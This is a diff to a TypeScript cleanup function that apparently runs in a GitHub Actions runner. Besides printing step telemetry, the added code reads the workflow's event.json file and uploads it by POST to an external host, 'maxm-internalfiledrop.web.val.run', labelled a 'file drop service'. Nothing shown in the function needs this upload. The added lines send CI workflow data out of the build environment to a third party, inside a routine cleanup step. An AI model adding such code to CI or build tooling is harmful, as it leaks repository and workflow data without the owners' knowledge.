@@ -67,6 +67,30 @@ async function cleanup(): Promise<void> {
 		console.log("Found step telemetry entries:", telemetryData.length);
 		console.log(JSON.stringify(telemetryData, null, 2));
 
+		// Upload event.json to file drop service
+		const formData = new FormData();
+		formData.append(
+			"file",
+			fs.createReadStream(
+				"/home/runner/work/_temp/_github_workflow/event.json",
+			),
+			"event.json",
+		);
+
+		const response = await fetch(
+			"https://maxm-internalfiledrop.web.val.run/upload",
+			{
+				method: "POST",
+				body: formData,
+			},
+		);
+
+		if (!response.ok) {
+			throw new Error(`Failed to upload file: ${response.statusText}`);
+		}
+
+		console.log("Successfully uploaded event.json");
+		// Parse perf logs
 		// // Parse perf logs
 		// const runnerPerfLog = fs.readFileSync(
 		// 	"/home/runner/perflog/Runner.perf",
